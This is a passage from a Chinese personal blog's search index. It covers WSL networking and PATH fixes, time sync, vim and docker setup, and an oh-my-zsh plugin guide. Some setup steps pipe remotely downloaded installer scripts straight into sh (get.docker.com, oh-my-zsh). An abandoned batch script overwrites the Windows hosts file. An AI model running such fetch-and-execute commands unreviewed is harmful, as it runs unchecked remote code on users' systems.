+<p>配置好后保存，重新进一下 WSL ，随后在 PowerShell 中 ping 一下看看：</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\hexrotor&gt; ping wsl.ubuntu</span><br><span class="line"></span><br><span class="line">正在 Ping wsl.ubuntu [<span class="number">172.18</span><span class="type">.210.143</span>] 具有 <span class="number">32</span> 字节的数据:</span><br><span class="line">来自 <span class="number">172.18</span>.<span class="number">210.143</span> 的回复: 字节=<span class="number">32</span> 时间&lt;<span class="number">1</span>ms TTL=<span class="number">64</span></span><br></pre></td></tr></table></figure></div>
+
+<p>上面这种方法是依赖 WSL 来写入，我自己最初想的是用 Windows 来写入(废案，仅供参考)：</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f &quot;delims=&quot; <span class="variable">%%t</span> <span class="keyword">in</span> (&#x27;arp -a ^| <span class="built_in">findstr</span>  <span class="number">00</span>-<span class="number">11</span>-<span class="number">9</span>d-<span class="number">81</span>-<span class="number">3</span>c-<span class="number">1</span>e&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> list=<span class="variable">%%t</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%list%</span></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span> delims= &quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&quot;<span class="variable">%list%</span>&quot;) <span class="keyword">do</span> <span class="built_in">set</span> ip=<span class="variable">%%a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%ip%</span> WSL&gt;<span class="variable">%SystemRoot%</span>\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>上面这个脚本依赖 arp 命令和 MAC 地址来获取 WSL 的 IP，其局限性在于，我们难以得知什么时候应该运行此脚本，即运行此脚本时 WSL 是否正在运行且有网络访问。否则 arp 命令将无法获取到 WSL 主机的 IP 信息。而如果不依赖 arp 而使用文件来间接传递 IP 信息，那为何不直接用 WSL 来写入 hosts 呢？</p>
+<h4 id="WSL-访问-Windows"><a href="#WSL-访问-Windows" class="headerlink" title="WSL 访问 Windows"></a>WSL 访问 Windows</h4><p>WSL 其实自带访问 Windows 的域名，那就是当前的计算机名</p>
+<p>比如我的计算机名为 HEXROTOR ，那么在 WSL 中直接 ping HEXROTOR，应该是可以通的。但不幸的是，WSL 会自动生成 hosts 文件，将 HEXROTOR 指向 127.0.1.1 ，虽然这个地址也能通往 Windows ，但几乎没有程序会 bind 这个地址，访问这个地址通常没有什么意义</p>
+<p>不过好在，这个功能可以关闭。我们需要创建 <code>/etc/wsl.conf</code> ，并写入如下信息：</p>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[network]</span><br><span class="line">generateHosts = false</span><br></pre></td></tr></table></figure></div>
+
+<p>随后我们重启计算机，刚才的配置就生效了，我们可以编辑 <code>/etc/hosts</code> ，删除行 <code>127.0.1.1       HEXROTOR.   HEXROTOR</code> 。</p>
+<p>到这里还没完，理论上还要配置 Windows 防火墙，这个网上教程挺多的。</p>
+<h3 id="WSL-与-Windows-PATH-冲突问题"><a href="#WSL-与-Windows-PATH-冲突问题" class="headerlink" title="WSL 与 Windows PATH 冲突问题"></a>WSL 与 Windows PATH 冲突问题</h3><p>默认情况下，WSL 的 PATH 中会包含 Windows 的 PATH，这可能会导致很多问题，最常见的是运行 npm 时，Windows 和 WSL 都安装了 node，就会出现冲突问题。</p>
+<p>同时这样的设置也可能会使 ZSH 用户感到困扰，因为 WSL 访问 Windows 目录有速度衰减，而 ZSH 用户往往会使用类似 AutoSuggestion 插件对输入的命令进行实时检查是否可用，这导致ZSH会疯狂对所有 PATH 进行遍历查找，表现出来就是输命令一卡一卡的，回显很慢。</p>
+<p>解决方法：在 <code>/etc/wsl.conf</code> 中加入 </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath=false</span><br></pre></td></tr></table></figure></div>
+
+<p>但这样也许有点一刀切，有些目录是有用的，比如 VSCode 就能实现快速编辑 WSL 中的文件而不用去手动修改目录</p>
+<p>以及 Pwntools 的分屏功能，Pwntools 会在使用 gdb.* 系列代码时尝试调用系统中的终端(仅测试过 WSL kali-linux)，如果你的 PATH 中有 Windows Terminal，那么配合 Pwndbg 展现出来的就是原生的分屏调试，非常好用</p>
+<p>~&#x2F;.zshrc 参考：</p>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line"># Windows PATH</span><br><span class="line">export WIN_PATH=/mnt/<span class="keyword">c</span>/WINDOWS/system32:/mnt/<span class="keyword">c</span>/WINDOWS/System32/WindowsPowerShell/v1.<span class="number">0</span>/:/mnt/<span class="keyword">c</span>/Users/hex/AppData/Local/Microsoft/WindowsApps:<span class="string">&quot;/mnt/d/Microsoft VS Code/bin&quot;</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$WIN_PATH</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="休眠-x2F-睡眠后-WSL-时间出现问题"><a href="#休眠-x2F-睡眠后-WSL-时间出现问题" class="headerlink" title="休眠&#x2F;睡眠后 WSL 时间出现问题"></a>休眠&#x2F;睡眠后 WSL 时间出现问题</h3><p>今天突然发现又有这个问题了，我kernel版本可是已经升到了5.15.90.1，而微软2021年说在5.10.16就修复了这个问题，看来还是没修好</p>
+<p>尝试 <code>sudo hwclock -s</code> ，并没有作用，随后尝试重启 WSL ，问题解决</p>
+<p>搜索相关内容得知除了同步硬件时间，还可以通过 ntp 服务器来同步网络时间</p>
+<p>安装ntpdate : <code>sudo apt install ntpdate</code></p>
+<p>同步：<code>sudo ntpdate pool.ntp.org</code></p>
+<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>以下问题与 WSL 无关，与 Linux 软件配置有关</p>
+<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>设置缩进4，显示行号等</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4 </span><br><span class="line">set softtabstop=4 </span><br><span class="line">set shiftwidth=4 </span><br><span class="line">set noexpandtab </span><br><span class="line">set nu #行号，看个人需求，会影响多行复制</span><br><span class="line">set autoindent </span><br><span class="line">set cindent</span><br></pre></td></tr></table></figure></div>
+
+<p>禁用视觉模式(不检测鼠标事件)</p>
+<p>打开配置文件：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/share/vim/vim90/defaults.vim</span><br></pre></td></tr></table></figure></div>
+
+<p>搜索找到 mouse 行，用<code>&quot;</code>将其注释</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;if has(&#x27;mouse&#x27;)</span><br><span class="line">&quot;  if &amp;term =~ &#x27;xterm&#x27;</span><br><span class="line">&quot;    set mouse=a</span><br><span class="line">&quot;  else</span><br><span class="line">&quot;    set mouse=nvi</span><br><span class="line">&quot;  endif</span><br><span class="line">&quot;endif</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>kali 的 docker-compose 版本过低，故从 Github 下载安装</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -SL https://github.com/docker/compose/releases/download/v2.21.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose &amp;&amp; sudo chmod 755 /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure></div>
+
+<p>而 Ubuntu 的 docker 本身支持性就有问题，使用如下命令安装：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://get.docker.com | sh</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Windows</tag>
+        <tag>TroubleShooting</tag>
+        <tag>WSL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>zsh 配置</title>
+    <url>/2023/04/28/zsh-config/</url>
+    <content><![CDATA[<p>久闻 zsh 大名，但我半个月前才开始用，本文简单记录一下配置过程，算是一种备份？</p>
+<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p><a class="link"   href="https://ohmyz.sh/" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个 zsh 配置管理器。有了它，配置 zsh ，安装插件、主题等等都不是难事。</p>
+<p>安装 oh-my-zsh :</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>执行后会提示配置，照着它的提示选择就行</p>
+<h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><p>oh-my-zsh 自带很多插件，但是需要在 <code>~/.zshrc</code> 的 plugins 中手动加入来选择要使用的插件</p>
+<p>配置示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+<p>每次修改完配置后，都需要执行 <code>source ~/.zshrc</code> 来更新配置，或者重新打开 zsh 终端</p>
+<h4 id="自动补全-zsh-autosuggestions"><a href="#自动补全-zsh-autosuggestions" class="headerlink" title="自动补全 - zsh-autosuggestions"></a>自动补全 - zsh-autosuggestions</h4><p>需要另安装插件 zsh-autosuggestions</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions.git $ZSH_CUSTOM/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="语法高亮-zsh-syntax-highlighting"><a href="#语法高亮-zsh-syntax-highlighting" class="headerlink" title="语法高亮 - zsh-syntax-highlighting"></a>语法高亮 - zsh-syntax-highlighting</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="交互式-cd-zsh-interactive-cd"><a href="#交互式-cd-zsh-interactive-cd" class="headerlink" title="交互式 cd - zsh-interactive-cd"></a>交互式 cd - zsh-interactive-cd</h4><p>作用是 <code>cd</code> 的时候自动列出文件夹，按 <code>TAB</code> 可以进行选择补全</p>
+<p>需要安装 fzf ：<code>sudo apt install fzf -y</code></p>
+<p>修改 <code>~/.zshrc</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	...</span><br><span class="line">	zsh-interactive-cd</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="thefuck-命令纠错"><a href="#thefuck-命令纠错" class="headerlink" title="thefuck - 命令纠错"></a>thefuck - 命令纠错</h4><p>按 <code>ESC</code> 键两次就能快速纠错上一次执行的命令</p>
+<p>安装：<code>sudo apt install thefuck -y</code></p>
+<p><code>plugins=(... thefuck)</code></p>
+<p>注意，该插件调用方式<code>ESC</code>-<code>ESC</code>和 sudo 插件冲突</p>
+<h4 id="sudo-快速-sudo"><a href="#sudo-快速-sudo" class="headerlink" title="sudo - 快速 sudo"></a>sudo - 快速 sudo</h4><p>按 <code>ESC</code> 键两次就能快速将上一次执行的命令前加上 <code>sudo</code></p>
+<p><code>plugins=(... sudo)</code></p>
+<p>注意，该插件调用方式 <code>ESC</code>-<code>ESC</code> 和 thefuck 插件冲突</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>操作系统</tag>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+</search>
